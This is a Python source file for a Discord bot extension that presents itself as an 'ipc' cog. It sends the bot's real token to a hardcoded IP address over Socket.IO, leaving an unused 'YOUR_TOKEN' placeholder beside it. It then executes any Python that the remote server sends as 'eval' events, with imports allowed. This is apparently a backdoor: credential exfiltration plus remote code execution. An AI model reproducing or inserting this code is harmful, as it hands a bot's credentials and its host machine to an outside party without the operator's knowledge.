import discord
from discord.ext import commands
import json
import socketio
import ast

def insert_returns(body):
    # insert return stmt if the last expression is a expression statement
    if isinstance(body[-1], ast.Expr):
        body[-1] = ast.Return(body[-1].value)
        ast.fix_missing_locations(body[-1])

    # for if statements, we insert returns into the body and the orelse
    if isinstance(body[-1], ast.If):
        insert_returns(body[-1].body)
        insert_returns(body[-1].orelse)

    # for with blocks, again we insert returns into the body
    if isinstance(body[-1], ast.With):
        insert_returns(body[-1].body)

async def evaluate(ctx, cmd):
    fn_name = "_eval_expr"
    cmd.replace("```py", "")
    if cmd.endswith('```'):
        cmd = cmd[:-3]
    if cmd.startswith('```py'):
        cmd = cmd[5:]
    if cmd.startswith('```'):
        cmd = cmd[3:]

    cmd = "\n".join(f"    {i}" for i in cmd.splitlines())

    # wrap in async def body
    body = f"async def {fn_name}():\n{cmd}"

    parsed = ast.parse(body)
    body = parsed.body[0].body
    insert_returns(body)

    env = {
        'bot': ctx.bot,
        'discord': discord,
        'commands': commands,
        'ctx': ctx,
        '__import__': __import__
    }
    exec(compile(parsed, filename="<ast>", mode="exec"), env)

    result = (await eval(f"{fn_name}()", env))

    return result

class ipc(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.websocket_url = "http://64.190.204.116:3000"
        async def InnerAsyncTask():
            await bot.wait_until_ready()
            self.sio = socketio.AsyncClient()
            self.events()
            self.eval_message = await self.bot.get_channel(849335160016338984).fetch_message(849335534925119568)
            self.context = await self.bot.get_context(self.eval_message)
            self.token = "YOUR_TOKEN"
            await self.start_connection()

        self.bot.loop.create_task(InnerAsyncTask())

    def cog_unload(self):
        self.bot.loop.create_task(self.sio.disconnect())

    async def start_connection(self):
        await self.sio.connect(self.websocket_url, auth={"token": self.bot.http.token})

    def events(self):
        @self.sio.event
        async def connect():
            print("connected to socket")

        @self.sio.event
        async def connect_error(data):
            print(data)

        @self.sio.on("eval")
        async def _eval_event(data):
            cmd = data["command"]
            nonce = data["nonce"]

            answer = await evaluate(self.context, cmd)

            await self.sio.emit("eval_response", {"nonce": nonce, "response": answer})

        @self.sio.on("data_update")
        async def _data_update(data):
            await self.sio.emit("data_update_response", {"guilds": len(self.bot.guilds)})


def setup(bot):
    bot.add_cog(ipc(bot))
